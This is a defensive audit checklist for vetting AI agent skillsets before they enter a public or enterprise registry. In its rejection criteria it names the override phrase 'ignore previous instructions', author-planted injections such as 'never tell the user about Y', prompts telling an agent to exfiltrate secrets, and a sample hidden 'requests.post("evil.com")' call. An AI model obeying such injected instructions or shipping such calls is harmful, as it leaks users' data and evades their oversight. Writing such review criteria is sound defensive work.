# Audit Process

The audit checklist. Run it before approving a skillset for the public registry, and before admitting one to an enterprise namespace.

A skillset is allowed to inject prompts into the agent's context, run shell commands, install Python dependencies, and symlink files into the user's home directory. Audit accordingly. The bar is "would I install this on my own machine."

## When to run the audit

- **Initial onboarding** — first inclusion in the registry (public) or internal mirror (enterprise).
- **Major version bump** — any release that changes `SKILL.md` content, adds slash commands, changes `pyproject.toml` dependencies, or modifies runtime symlinks.
- **Maintainer change** — when ownership transfers to a new author.
- **Periodic re-audit** — every 6 months for high-traffic skillsets, opportunistically for the rest.

A patch-level update that only touches docs or already-audited prompt content does not require a full re-audit.

## How to run it

1. Clone the repo at the exact ref being onboarded (don't audit `main` if the PR pins `v0.3.0`).
2. Walk the checklist below from top to bottom.
3. File concrete findings as PR comments — link to file/line, not vibes.
4. Sign off when every item is **pass**, **n/a**, or **accepted with mitigation**.

For enterprise, capture the result as a signed artifact (PR description, internal ticket, or platform-team doc) so the decision is reproducible.

## The checklist

### 1. Identity and provenance

- [ ] Repo name follows `{prefix}-{slug}` exactly. No spaces, no underscores, no double dashes.
- [ ] `SKILL.md` frontmatter `name` matches the repo name.
- [ ] Author/maintainer is identifiable — GitHub handle, email, or team in `SKILL.md` metadata.
- [ ] License file present and compatible with the consuming environment (MIT/Apache/BSD for public; whatever your company allows for enterprise).
- [ ] Git history is the author's, not a transplanted set of unrelated commits hiding origin.

### 2. SKILL.md content (umbrella + subskillsets)

- [ ] Description is honest and scoped — it actually describes what the skill does, not aspirational marketing.
- [ ] Activation guidance ("use when X") is specific enough that the agent won't fire it on unrelated requests.
- [ ] No prompt-injection vectors: no instructions that override the user's intent, no "ignore previous instructions" patterns, no hidden role-play scaffolding.
- [ ] No data exfiltration prompts — the skill must not instruct the agent to send file contents, env vars, secrets, or chat history to any external endpoint.
- [ ] `allowed-tools` (when present) is the minimum needed. Reject blanket `Bash(*)` if the skill only needs a few commands.
- [ ] Subskillsets under `skills/<subskill>/SKILL.md` follow the same rules. Each is audited individually.

### 3. Slash commands (`commands/*.md`)

- [ ] Filenames follow the prefix convention so users see consistent `/{prefix}-*` naming.
- [ ] No command shells out via untrusted input without quoting/escaping.
- [ ] No command writes outside `~/.geno-tools/{repo}/`, the user's working directory, or explicit user-confirmed paths.
- [ ] No command touches another skillset's directory.
- [ ] Side-effecting commands (network calls, deletes, pushes, sends) require user confirmation in the prompt.

### 4. Code, dependencies, and runtime

- [ ] `pyproject.toml` deps are pinned or version-bounded. No unbounded `*` requirements.
- [ ] No deps from unmaintained or low-trust sources (typosquats, abandoned packages).
- [ ] Top-level Python modules import only what they declare. No surprise `requests.post("evil.com")` at import time.
- [ ] Any runtime symlinks (`scripts/`) target files inside the repo, not absolute paths elsewhere.
- [ ] Any post-install hooks are inspectable and idempotent.

### 5. Network and data boundaries

- [ ] All outbound network calls are documented in `SKILL.md` (which hosts, why, what data).
- [ ] No telemetry to third parties without explicit opt-in.
- [ ] No credentials, tokens, or API keys committed to the repo (even in tests or fixtures).
- [ ] Cloud/SaaS integrations document where keys are read from (env var, keychain) and never log them.
- [ ] For enterprise: confirm that the skill's network destinations are on the allowlist.

### 6. Filesystem and host impact

- [ ] Install touches only `~/.geno-tools/<repo>/` for state. Anything outside that path is opt-in and documented.
- [ ] Removal (`geno-tools remove <slug>`) cleans up everything the install added (caveat: `--keep-data` is allowed to retain user data).
- [ ] No silent modifications to `~/.zshrc`, `~/.bashrc`, `~/.config/`, etc.
- [ ] No `sudo` invocations.

### 7. Multi-agent integration

- [ ] `npx skills add` registers the skill cleanly across all supported agents (Claude Code, Codex, Cursor, Gemini CLI, OpenCode).
- [ ] Manifests at `.claude-plugin/`, `.codex-plugin/`, `.cursor-plugin/`, `.opencode/`, and `gemini-extension.json` (if shipped) point at the shared `skills/` directory and don't diverge per platform.
- [ ] Skill activates and produces sane output on at least one supported agent in a fresh install.

### 8. Documentation

- [ ] README explains: what it does, install, prerequisites, supported platforms, removal.
- [ ] `SKILL.md` lists every slash command with a one-line description.
- [ ] Any required env vars / external services are documented up front.
- [ ] A `CHANGELOG` or release notes exist for non-trivial versions.

### 9. Removal contract

- [ ] `geno-tools remove <slug>` runs to completion with no errors.
- [ ] After removal: `~/.geno-tools/<repo>/` is gone (or empty, if `--keep-data`), `~/.local/bin/` symlinks owned by this skillset are gone, and `npx skills remove` reports the skill removed from every agent it was registered with.

### 10. Sign-off

- [ ] Every item above is pass / n/a / accepted-with-mitigation.
- [ ] A reviewer is named in the PR / ticket.
- [ ] The audit artifact (PR comment or internal doc) is linked from the registry entry or internal manifest.

## Failure modes — common reasons we reject

- **Aspirational SKILL.md** — describes capabilities the code doesn't implement. Misleads the agent into trying to invoke things that don't exist.
- **Prompt injection by author** — `SKILL.md` contains "always run X first" or "never tell the user about Y." Hard reject.
- **Unpinned wildcard deps** — `requests = "*"` lets a future bad release of `requests` ride in.
- **Hidden network calls** — module imports that POST to a third-party endpoint at install or first use.
- **Cross-skillset writes** — a skill that mutates `~/.geno-tools/{another-skillset}/` directly instead of going through `geno-tools`.
- **Silent shell rc edits** — appending to `~/.zshrc` without telling the user.

## Lightweight re-audit

For minor updates already covered by a previous full audit, run a delta audit:

1. `git diff <last-audited-ref>..<new-ref>` — confirm only docs/comment changes.
2. `git diff -- pyproject.toml requirements*.txt` — confirm no dep changes.
3. `git diff -- 'SKILL.md' 'skills/**/SKILL.md' 'commands/**'` — confirm no prompt or command changes.

If any of those return non-trivial diffs, escalate to a full audit.
